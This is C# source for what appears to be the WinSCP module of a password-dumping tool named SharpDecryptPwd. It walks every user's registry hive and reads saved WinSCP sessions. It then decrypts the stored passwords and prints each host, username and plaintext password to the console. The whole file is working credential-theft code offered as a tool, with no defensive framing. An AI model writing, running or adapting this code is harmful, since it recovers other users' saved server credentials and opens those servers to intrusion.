// SharpDecryptPwd.WinSCP
using Microsoft.Win32;
using System;
using System.Collections.Generic;

internal class WinSCP
{
    public string dec_nex(Array hash)
    {
        return "1";
    }

    private static int dec_nex(List<string> list)
    {
        int num = int.Parse(list[0]);
        int num2 = int.Parse(list[1]);
        return 0xFF ^ ((((num << 4) + num2) ^ 0xA3) & 0xFF);
    }

    private static string decode(string user, string pass, string host)
    {
        List<string> list = new List<string>();
        for (int i = 0; i < pass.Length; i++)
        {
            list.Add(pass[i].ToString());
        }
        List<string> list2 = new List<string>();
        for (int j = 0; j < list.Count; j++)
        {
            if (list[j] == "A")
            {
                list2.Add("10");
            }
            if (list[j] == "B")
            {
                list2.Add("11");
            }
            if (list[j] == "C")
            {
                list2.Add("12");
            }
            if (list[j] == "D")
            {
                list2.Add("13");
            }
            if (list[j] == "E")
            {
                list2.Add("14");
            }
            if (list[j] == "F")
            {
                list2.Add("15");
            }
            if ("ABCDEF".IndexOf(list[j]) == -1)
            {
                list2.Add(list[j]);
            }
        }
        List<string> list3 = list2;
        int num = 0;
        if (dec_nex(list3) == 255)
        {
            num = dec_nex(list3);
            list3.Remove(list3[0]);
            list3.Remove(list3[0]);
            list3.Remove(list3[0]);
            list3.Remove(list3[0]);
            num = dec_nex(list3);
        }
        List<string> list4 = list3;
        list4.Remove(list4[0]);
        list4.Remove(list4[0]);
        int num2 = dec_nex(list3) * 2;
        for (int k = 0; k < num2; k++)
        {
            list3.Remove(list3[0]);
        }
        string text = "";
        for (int l = 0; l <= num; l++)
        {
            string str = ((char)dec_nex(list3)).ToString();
            list3.Remove(list3[0]);
            list3.Remove(list3[0]);
            text += str;
        }
        string text2 = user + host;
        int num3 = text.Length - 1;
        int count = text.IndexOf(text2);
        text = text.Remove(0, count);
        return text.Replace(text2, "");
    }

    public static void WinSCPCrypto()
    {
        RegistryKey users = Registry.Users;
        RegistryKey users2 = Registry.Users;
        Console.WriteLine("");
        Console.WriteLine("========== WinSCPpwd ==========");
        Console.WriteLine("");
        string[] subKeyNames = users.GetSubKeyNames();
        foreach (string text in subKeyNames)
        {
            if (text.IndexOf("S-1-5-21-") == -1 || text.IndexOf("Classes") != -1)
            {
                continue;
            }
            try
            {
                RegistryKey registryKey = users2.OpenSubKey(text);
                RegistryKey registryKey2 = registryKey.OpenSubKey("Software");
                RegistryKey registryKey3 = registryKey2.OpenSubKey("Martin Prikryl");
                RegistryKey registryKey4 = registryKey3.OpenSubKey("WinSCP 2");
                RegistryKey registryKey5 = registryKey4.OpenSubKey("Sessions");
                //Console.WriteLine("=============================================");
                string[] subKeyNames2 = registryKey5.GetSubKeyNames();
                foreach (string text2 in subKeyNames2)
                {
                    if (text2.IndexOf("Default%20Settings") == -1)
                    {
                        Console.WriteLine("KEY NAME:" + text2);
                        RegistryKey registryKey6 = registryKey5.OpenSubKey(text2);
                        string text3 = registryKey6.GetValue("HostName").ToString();
                        string text4 = registryKey6.GetValue("UserName").ToString();
                        string text5 = registryKey6.GetValue("Password").ToString();
                        string str = decode(text4, text5, text3);
                        Console.WriteLine("HOST:" + text3);
                        Console.WriteLine("USER:" + text4);
                        Console.WriteLine("PASS:" + text5);
                        Console.WriteLine("Decrypt PASS:" + str);
                        Console.WriteLine("=============================================");
                    }
                }
            }
            catch
            {
            }
        }
    }
}
